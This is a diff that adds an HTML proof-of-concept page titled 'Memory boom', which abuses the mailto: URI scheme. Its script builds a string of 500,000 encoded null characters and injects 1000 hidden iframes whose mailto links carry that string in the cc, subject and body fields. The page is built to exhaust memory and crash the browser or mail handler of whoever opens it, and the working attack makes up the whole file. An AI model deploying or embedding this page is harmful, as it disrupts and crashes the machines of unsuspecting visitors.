@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Memory boom or how to abuse mailto: URI scheme</title>
+<script src="//code.jquery.com/jquery-1.12.0.min.js"></script>
+<script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
+</head>
+
+<body>
+<p>Memory boom (or how to abuse mailto: URI scheme)</p>
+
+<p id="status">Get ready...</p>
+<p id="result" style="color:red"></p>
+</body>
+
+<script type="text/javascript">
+var extraData = "";
+for (itxextraData = 0; itxextraData < 50000; itxextraData++) {
+     var extraData = extraData + "%00%00%00%00%00%00%00%00%00%00";
+}
+for (itxIframeFlood = 0; itxIframeFlood < 1000; itxIframeFlood++) {
+     jQuery('#result').append('<iframe style="visibility:hidden;" src="mailto:?cci=' + extraData + '&cc=' + extraData + '&subject=' + extraData + '&body=' + extraData + '&' + extraData + '"></iframe>');
+}
+</script>
+</html>
